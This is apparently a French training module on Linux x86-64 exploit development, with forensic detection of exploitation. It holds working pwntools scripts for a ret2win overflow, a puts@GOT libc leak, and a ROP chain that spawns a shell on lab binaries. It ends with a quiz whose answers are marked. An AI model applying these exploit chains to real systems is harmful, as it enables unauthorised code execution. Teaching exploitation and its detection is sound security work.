# TOME P10 — DFIR & Reverse Engineering — Jour 448 (6h) : Exploit Development Fondamental (Buffer Overflow, ROP Chains & Exploitation Linux x86-64)

> [!NOTE]
> **Objectifs pédagogiques :**
> - Comprendre et exploiter un **Stack Buffer Overflow** classique sur Linux x86-64
> - Contourner les protections modernes : **ASLR, Stack Canaries, NX/DEP** avec des techniques **ROP (Return-Oriented Programming)**
> - Écrire un **exploit Python3/pwntools** fonctionnel pour un binaire vulnérable contrôlé
> - Appliquer ces connaissances à la **détection et analyse** de preuves d'exploitation en forensique
>
> **Compétences visées :** `SEC-06` (A) — Exploit Development, `SEC-05` (A) — Vulnerability Research

---

## Module 1 — Stack Buffer Overflow & Contrôle du RIP (2h)

### 📖 Intuition & Narration

Imaginez une pile de plateaux dans un restaurant. Chaque fonction appelée empile un plateau sur la pile. Sur ce plateau, il y a les variables locales, la valeur de retour, et l'**adresse de retour** — où le CPU doit revenir quand la fonction se termine. Un buffer overflow, c'est quand un mauvais chef fait déborder le plateau au-dessus, écrasant l'adresse de retour. Si un attaquant contrôle ce déversement, il contrôle où le programme "retourne" — et donc ce qu'il exécute ensuite.

### 🔍 Anatomie Technique — Layout de la Pile x86-64

```
LAYOUT DE LA PILE LORS D'UN APPEL DE FONCTION

  ADRESSES HAUTES
  ┌─────────────────────────────────────────┐  ← rbp + 0x18
  │  Argument 7+ (si > 6 args)              │
  ├─────────────────────────────────────────┤  ← rbp + 0x10
  │  Adresse de retour (saved RIP) ⚠️       │  ← CIBLE DU BUFFER OVERFLOW
  ├─────────────────────────────────────────┤  ← rbp
  │  Saved RBP (frame pointer parent)       │
  ├─────────────────────────────────────────┤  ← rbp - 0x8
  │  Variable locale 1 (ex: char buf[64])   │
  ├─────────────────────────────────────────┤  ← rbp - 0x48
  │  Variable locale 2                      │
  └─────────────────────────────────────────┘  ← rsp (sommet pile)
  ADRESSES BASSES

  ⚠️ BUFFER OVERFLOW : Si buf[] déborde (>64 bytes),
  on écrase Saved RBP puis Saved RIP → contrôle du flux d'exécution !
```

### 🛠️ Atelier Pratique — Exploitation avec pwntools (Environnement Contrôlé)

```python
#!/usr/bin/env python3
"""
PARADIS — Lab Buffer Overflow x86-64
Environnement contrôlé : binaire vulnérable compilé SANS protections
gcc -o vuln vuln.c -fno-stack-protector -no-pie -z execstack
PROTECTIONS DÉSACTIVÉES POUR L'APPRENTISSAGE — Ne jamais utiliser en production
"""

from pwn import *

# ══════════════════════════════════════════════════════
# ÉTAPE 1 — Trouver l'offset pour écraser RIP
# ══════════════════════════════════════════════════════

binary = ELF('./vuln')

# Générer un pattern cyclique pour trouver l'offset exact
# Au lieu de 'AAAA...', on envoie un pattern unique
pattern = cyclic(200)
print(f"[*] Pattern généré : {pattern[:20]}...")

# Lancer le binaire avec le pattern → il va crasher
p = process('./vuln')
p.sendline(pattern)
p.wait()

# Analyser le core dump avec pwntools
core = Coredump('./core')
offset = cyclic_find(core.rip)  # Trouver l'offset depuis le crash RIP
print(f"[*] Offset jusqu'à RIP : {offset} bytes")

# ══════════════════════════════════════════════════════
# ÉTAPE 2 — Contrôler RIP (sans protections)
# ══════════════════════════════════════════════════════

# Adresse d'une fonction win() qu'on veut atteindre
WIN_ADDR = binary.sym['win']  # Adresse de la fonction win()
print(f"[*] Adresse de win() : {hex(WIN_ADDR)}")

# Construction du payload
payload = b'A' * offset          # Remplir jusqu'à RIP
payload += p64(WIN_ADDR)         # Écraser RIP avec win()

# Envoyer l'exploit
p = process('./vuln')
p.sendline(payload)
response = p.recvall()
print(f"[+] Réponse : {response}")

# ══════════════════════════════════════════════════════
# ÉTAPE 3 — AVEC ASLR activé : Leak d'adresse et calcul
# ══════════════════════════════════════════════════════
# Quand l'ASLR est activé, les adresses changent à chaque exécution.
# Si le binaire leak une adresse (format string bug, etc.), on peut
# calculer l'offset depuis la base pour trouver les autres adresses.

# Exemple : le binaire affiche "Buffer address: 0x7ffd3a2b4c10"
p = process('./vuln_with_leak')
leak_line = p.recvline()
leaked_addr = int(leak_line.split(b': ')[1], 16)
print(f"[*] Adresse leakée : {hex(leaked_addr)}")

# Si leaked_addr est buf[0] et win() est à base+0x1234 :
binary_base = leaked_addr - binary.sym['buf']
win_addr = binary_base + binary.sym['win']
```

---

## Module 2 — Contournement des Protections : ASLR, Canaries, NX/DEP & ROP (2h)

### 📖 Intuition & Narration

Les compilateurs modernes et le noyau déploient plusieurs couches de protection contre les buffer overflows. Comprendre ces protections est essentiel pour deux raisons : en tant qu'analyste forensique, pour identifier les exploits détectés ; en tant que pentesteur/RE, pour comprendre comment les attaquants sophistiqués les contournent.

### 🔍 Anatomie Technique — Protections & Contournements

```
PROTECTIONS MODERNES CONTRE LES BUFFER OVERFLOWS

1. STACK CANARY (gcc -fstack-protector)
   ├── Un nombre aléatoire est placé AVANT Saved RBP
   ├── Vérifié à la fin de la fonction → si modifié : __stack_chk_fail()
   └── Contournement :
       a) Leak du canary via format string / autre vulnérabilité
       b) Overwrite exact sans toucher le canary (bug non-contigu)
       c) Brute-force sur fork() (le canary ne change pas entre fork())

2. ASLR — Address Space Layout Randomization (noyau)
   ├── Randomise les adresses de la pile, heap, et bibliothèques
   └── Contournement :
       a) Leak d'adresse (printf format string, heap info disclosure)
       b) PIE désactivé → sections .text à adresse fixe
       c) Ret2libc/ROP sans shellcode (utilise du code existant)

3. NX/DEP — No-Execute (W^X : Write XOR Execute)
   ├── La pile n'est plus exécutable → shellcode classique impossible
   └── Contournement : ROP (Return-Oriented Programming)
       Utiliser des "gadgets" de code existant dans le binaire/libc

4. PIE — Position Independent Executable
   ├── Le binaire lui-même est chargé à une adresse aléatoire
   └── Contournement : Leak d'adresse du binaire + calcul d'offset

ROP — RETURN-ORIENTED PROGRAMMING
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

Principe : Au lieu d'injecter du shellcode, on chaîne des "gadgets"
(petites séquences d'instructions existantes terminées par 'ret')
pour construire l'exécution désirée.

Exemple — Appeler execve("/bin/sh", NULL, NULL) via ROP :

  Gadget 1 : pop rdi; ret      → rdi = adresse de "/bin/sh"
  Gadget 2 : pop rsi; ret      → rsi = 0 (NULL)
  Gadget 3 : pop rdx; ret      → rdx = 0 (NULL)
  Gadget 4 : pop rax; ret      → rax = 59 (syscall execve)
  Gadget 5 : syscall           → appel kernel

Chaque gadget est une adresse dans la pile → on les chaîne via 'ret'
```

### 🛠️ Atelier Pratique — ROP Chain avec pwntools & ROPgadget

```python
#!/usr/bin/env python3
"""
PARADIS — Lab ROP Chain (NX activé, ASLR partiellement contourné)
Objectif : appeler system("/bin/sh") via ROP sans shellcode
"""

from pwn import *

binary = ELF('./vuln_nx')
libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')

# ══════════════════════════════════════════════════════
# ÉTAPE 1 — Leak de l'adresse de puts@GOT pour calculer base libc
# ══════════════════════════════════════════════════════
rop = ROP(binary)
POP_RDI_RET = rop.find_gadget(['pop rdi', 'ret'])[0]
PUTS_PLT     = binary.plt['puts']
PUTS_GOT     = binary.got['puts']
MAIN         = binary.sym['main']

# Payload : appeler puts(puts@GOT) pour leaker l'adresse réelle de puts
payload1 = b'A' * OFFSET
payload1 += p64(POP_RDI_RET)  # Gadget : pop rdi ; ret
payload1 += p64(PUTS_GOT)     # rdi = adresse GOT de puts
payload1 += p64(PUTS_PLT)     # Appeler puts → affiche adresse réelle
payload1 += p64(MAIN)         # Retourner à main pour un 2e exploit

p = process('./vuln_nx')
p.sendline(payload1)
leak = u64(p.recvline().strip().ljust(8, b'\x00'))
print(f"[*] puts() libc réelle : {hex(leak)}")

# ══════════════════════════════════════════════════════
# ÉTAPE 2 — Calculer les adresses libc réelles depuis le leak
# ══════════════════════════════════════════════════════
libc.address = leak - libc.sym['puts']
SYSTEM = libc.sym['system']
BIN_SH = next(libc.search(b'/bin/sh'))
print(f"[*] system() : {hex(SYSTEM)}")
print(f"[*] /bin/sh  : {hex(BIN_SH)}")

# ══════════════════════════════════════════════════════
# ÉTAPE 3 — ROP Chain pour appeler system("/bin/sh")
# ══════════════════════════════════════════════════════
RET_GADGET = rop.find_gadget(['ret'])[0]  # Alignement stack 16 bytes

payload2 = b'A' * OFFSET
payload2 += p64(RET_GADGET)   # Stack alignment (System V ABI requiert 16-bytes)
payload2 += p64(POP_RDI_RET)  # pop rdi ; ret
payload2 += p64(BIN_SH)       # rdi = "/bin/sh"
payload2 += p64(SYSTEM)       # call system("/bin/sh")

p.sendline(payload2)
p.interactive()  # Shell interactif obtenu !
```

---

## Module 3 — Forensique de l'Exploitation : Identifier un Exploit Post-Mortem (1h30)

### 🔍 Anatomie Technique — IOCs d'Exploitation dans les Logs/Core Dumps

```bash
# ══════════════════════════════════════════════════════
# DÉTECTION D'EXPLOITATION EN FORENSIQUE
# ══════════════════════════════════════════════════════

# 1. Identifier un crash lié à un stack overflow
# Dans les logs système (dmesg / /var/log/kern.log)
grep "segfault\|stack smashing\|buffer overflow" /var/log/kern.log | tail -20
# → "vuln[1234]: segfault at 4141414141414141 rip 4141414141414141"
# → L'adresse 0x41 = 'A' → payload de test AAAA... classique

# 2. Analyser le core dump
gdb vuln core
(gdb) info registers
# → rip = 0x4141414141414141 (0x41='A' → pattern de test)
# → Ou rip = 0x7f... (adresse libc → ROP chain exploitation réelle)

(gdb) x/20xg $rsp
# → Si la pile montre des séquences d'adresses libc alignées = ROP chain

# 3. Audit des vulnérabilités avec checksec
checksec ./vuln
# OUTPUT :
# RELRO:    Partial RELRO
# Stack:    No canary found    ← Canary absent
# NX:       NX disabled        ← Pile exécutable (vieux binaire)
# PIE:      No PIE             ← Adresses fixes
# Fortify:  No

# 4. Vérifier les protections OS
cat /proc/sys/kernel/randomize_va_space
# 0 = ASLR désactivé (dangereux!)
# 1 = ASLR partiel
# 2 = ASLR complet (recommandé)
```

### 🚑 Terrain — Retour d'Expérience

**CVE-2021-4034 (PwnKit) — Élévation de Privilèges pkexec (2022)**

La vulnérabilité PwnKit affecte `pkexec` (SUID root) — présent sur TOUTES les distributions Linux depuis 2009. Un buffer overflow dans la gestion des arguments permet à n'importe quel utilisateur d'obtenir root. Forensique post-exploitation :

- `dmesg` montre : `pkexec[3421]: segfault at 0 rip 00007f... rsp 00007fff...`
- `auth.log` montre : `pam_unix(polkit-1:session): session opened for user root by (uid=1000)`
- `who` : utilisateur non-privilégié (UID 1000) avec session root ouverte = exploitation réussie

**Enseignement DFIR :** Les exploits locaux (LPE) laissent des traces dans `auth.log` + `dmesg` + les core dumps. La combinaison de ces trois sources permet de reconstituer l'exploitation.

---

## Nouvelles Abréviations Rencontrées

| Abréviation | Signification |
|:---:|:---|
| **ROP** | Return-Oriented Programming — Technique d'exploitation chaînant des gadgets de code existants pour contourner NX/DEP |
| **NX/DEP** | No-Execute / Data Execution Prevention — Protection empêchant l'exécution de données sur la pile/heap |
| **PIE** | Position Independent Executable — Binaire compilé pour être chargé à une adresse aléatoire (renforce ASLR) |
| **GOT/PLT** | Global Offset Table / Procedure Linkage Table — Structures ELF pour la résolution dynamique des fonctions de bibliothèques |
| **LPE** | Local Privilege Escalation — Vulnérabilité permettant à un utilisateur local d'obtenir des droits élevés (root/SYSTEM) |

---

## Exercices Pratiques

### Exercice 1 — Calcul de l'Offset

Un pattern cyclique de 200 bytes est envoyé à un binaire vulnérable. Le crash core dump montre `rip = 0x6161616f`. La fonction `cyclic_find(0x6161616f)` retourne 72. Que signifie cet offset ?

**Corrigé guidé :** L'offset 72 signifie qu'il faut **72 bytes de padding** avant d'écraser l'adresse de retour (RIP). Le payload sera donc : `b'A' * 72 + p64(TARGET_ADDRESS)`.

### Exercice 2 — Analyse d'un Core Dump

Dans un core dump, vous observez : `rsp` pointe vers une séquence `0x7f2a3b4c5d6e...` `0x7f2a3b4c7f80...` `0x7f2a3b4c8920...`. Ces adresses sont toutes dans la plage de libc. Que cela indique-t-il ?

**Corrigé guidé :** La pile contient une séquence d'adresses dans libc — c'est une **ROP chain** pointant vers des gadgets libc. L'attaquant a utilisé Ret2libc ou une ROP chain complète pour contourner NX. Analyser avec `info stack` dans GDB pour reconstruire la chaîne.

---

## Banque QCM — 5 Questions

**Q1.** Le **Stack Canary** protège contre les buffer overflows en :

- A) Randomisant les adresses mémoire du processus
- B) Plaçant une valeur aléatoire avant l'adresse de retour et la vérifiant avant `ret` ✅
- C) Marquant la pile comme non-exécutable
- D) Randomisant le binaire exécutable

**Q2.** La protection **NX/DEP** est contournée par les attaques **ROP** car :

- A) ROP modifie les permissions de la pile pour la rendre exécutable
- B) ROP exécute du code déjà présent dans le binaire/libc (gadgets), sans injecter de nouveau code ✅
- C) ROP désactive NX via un appel syscall spécifique
- D) ROP utilise la mémoire heap qui n'est pas couverte par NX

**Q3.** Dans un binaire ELF Linux, la **GOT (Global Offset Table)** contient :

- A) Le code compilé des fonctions de la bibliothèque standard
- B) Les adresses réelles des fonctions dynamiques (libc) résolues au runtime ✅
- C) Les chaînes de caractères utilisées par le programme
- D) Les constantes globales du programme

**Q4.** La commande `checksec ./binary` retourne `PIE: No PIE`. Cela signifie que :

- A) Le binaire ne peut pas s'exécuter sur les systèmes récents
- B) Les sections .text, .data du binaire sont à des adresses FIXES, facilitant les attaques ROP ✅
- C) La protection NX est désactivée sur ce binaire
- D) Le binaire est protégé contre toutes les formes d'exploitation mémoire

**Q5.** Dans le contexte forensique, un crash avec `rip = 0x4141414141414141` dans dmesg indique :

- A) Une erreur de compilation du programme
- B) Un test ou une exploitation par buffer overflow avec des 'A' (0x41) ✅
- C) Une corruption mémoire aléatoire due à une défaillance matérielle
- D) Une mise à jour du noyau qui a corrompu la mémoire

---

*(Le composant d'évaluation exigeant 75% minimum s'affiche ci-dessous)*
